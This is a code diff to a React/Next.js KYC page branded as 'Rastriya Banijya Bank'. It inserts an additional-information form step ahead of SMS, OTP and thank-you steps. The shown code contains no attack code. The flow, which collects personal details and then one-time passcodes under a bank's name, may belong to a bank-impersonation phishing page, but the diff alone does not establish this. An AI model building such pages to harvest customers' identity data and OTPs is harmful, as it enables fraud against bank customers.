@@ -3,11 +3,12 @@
 import { useState } from "react";
 import Image from "next/image";
 import { KycForm } from "@/components/kyc-form";
+import { AdditionalInfoForm } from "@/components/additional-info-form";
 import { SuccessCard } from "@/components/success-card";
 import { OtpVerify } from "@/components/otp-verify";
 import { KycThankYou } from "@/components/kyc-thank-you";
 
-type Step = "form" | "success" | "otp" | "thankyou";
+type Step = "form" | "additional" | "sms" | "otp" | "thankyou";
 
 export default function KycPage() {
   const [step, setStep] = useState<Step>("form");
@@ -15,7 +16,7 @@ export default function KycPage() {
 
   function handleFormSuccess(id: string) {
     setSubmissionId(id);
-    setStep("success");
+    setStep("additional");
   }
 
   return (
@@ -39,7 +40,28 @@ export default function KycPage() {
             <KycForm onSuccess={handleFormSuccess} />
           </div>
         )}
-        {step === "success" && submissionId && (
+
+        {step === "additional" && submissionId && (
+          <div className="bg-white rounded-2xl shadow-lg p-8 space-y-6">
+            <div className="text-center space-y-3">
+              <h1 className="text-xl font-bold text-gray-900">Rastriya Banijya Bank</h1>
+              <div className="flex justify-center">
+                <Image
+                  src="/1731390437-339067.png"
+                  alt="Rastriya Banijya Bank"
+                  width={80}
+                  height={80}
+                  className="object-contain"
+                  priority
+                />
+              </div>
+              <p className="text-sm text-gray-500">Additional Information</p>
+            </div>
+            <AdditionalInfoForm submissionId={submissionId} onSuccess={() => setStep("sms")} />
+          </div>
+        )}
+
+        {step === "sms" && submissionId && (
           <SuccessCard submissionId={submissionId} onContinue={() => setStep("otp")} />
         )}
         {step === "otp" && submissionId && (
